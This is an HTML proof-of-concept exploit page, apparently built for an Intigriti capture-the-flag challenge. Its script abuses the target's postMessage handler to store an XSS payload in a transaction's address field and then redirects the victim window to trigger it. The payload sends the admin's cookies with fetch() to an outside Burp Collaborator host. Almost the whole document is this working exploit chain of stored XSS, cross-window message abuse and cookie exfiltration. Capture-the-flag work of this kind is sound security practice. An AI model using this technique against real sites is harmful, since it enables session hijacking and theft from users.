<!DOCTYPE html>
<html lang="en">
<head>
    <title>Crypto Heist PoC</title>
</head>
<body>
    <h1>Executing MarketWatch XSS Chain...</h1>
    <p>Do not close this tab.</p>

    <script>
        // Step 1: Open the checkout page to prepare the CSRF
        const victimWindow = window.open('https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1', '_blank');
        
        // This payload breaks out of the title="" attribute in marketwatch.html
        // and sends the Admin's cookies directly to your Burp Collaborator.
        const XSS_PAYLOAD = '"><img src=x onerror="fetch(\'https://b4gofscv4huzfnm16g1zxfipfgl79zxo.oastify.com/?flag=\'+document.cookie)">';
        
        // Step 2: Wait 4 seconds for the Admin wallet to load, then send the malicious transaction
        setTimeout(() => {
            victimWindow.postMessage({
                type: 'submitTransaction',
                transaction: {
                    currency: '1337COIN',
                    amount: 1, 
                    toAddress: XSS_PAYLOAD // The XSS goes here!
                }
            }, '*');
            
            console.log("Transaction sent. Waiting for API to process...");

            // Step 3: Wait 2 seconds for the transaction to save, then redirect the Admin to MarketWatch to trigger the XSS
            setTimeout(() => {
                victimWindow.location.href = 'https://challenge-0126.intigriti.io/marketwatch.html';
            }, 2000);

        }, 4000); 
    </script>
</body>
</html>
